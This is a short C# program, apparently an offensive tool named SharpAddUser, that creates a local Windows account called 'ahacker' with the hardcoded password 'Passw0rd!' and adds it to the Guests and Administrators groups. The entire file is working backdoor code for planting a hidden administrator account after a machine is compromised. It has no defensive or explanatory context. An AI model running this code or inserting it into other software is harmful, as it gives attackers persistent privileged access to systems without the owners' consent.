using System;
using System.DirectoryServices;

namespace SharpAddUser
{
    class Program
    {
        static void Main(string[] args)
        {
            try
            {
                DirectoryEntry AD = new DirectoryEntry("WinNT://" +
                Environment.MachineName + ",computer");
                DirectoryEntry NewUser = AD.Children.Add("ahacker", "user");
                NewUser.Invoke("SetPassword", new object[] { "Passw0rd!" });
                NewUser.Invoke("Put", new object[] { "Description", "Test User from .NET" });
                NewUser.CommitChanges();
                DirectoryEntry grp;

                grp = AD.Children.Find("Guests", "group");
                if (grp != null) { grp.Invoke("Add", new object[] { NewUser.Path.ToString() }); }
                
                grp = AD.Children.Find("Administrators", "group");
                if (grp != null) { grp.Invoke("Add", new object[] { NewUser.Path.ToString() }); }
                
                Console.WriteLine("[>] Account Created Successfully");
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex.Message);
                Console.ReadLine();
            }
        }
    }
}